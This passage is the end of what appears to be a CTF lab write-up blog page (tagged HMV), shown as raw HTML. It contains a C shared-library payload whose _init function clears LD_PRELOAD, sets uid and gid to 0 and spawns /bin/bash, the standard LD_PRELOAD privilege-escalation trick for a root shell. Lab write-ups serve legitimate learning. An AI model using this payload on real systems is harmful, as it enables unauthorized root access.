</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/types.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">_init</span>() {
</span></span><span style="display:flex;"><span>    unsetenv(<span style="color:#f1fa8c">&#34;LD_PRELOAD&#34;</span>);
</span></span><span style="display:flex;"><span>    setgid(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    setuid(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    system(<span style="color:#f1fa8c">&#34;/bin/bash&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>
		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/hmv">HMV</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		<div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        var disqus_shortname = 'ldrx30';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>

</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2024  © ldrx30 |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
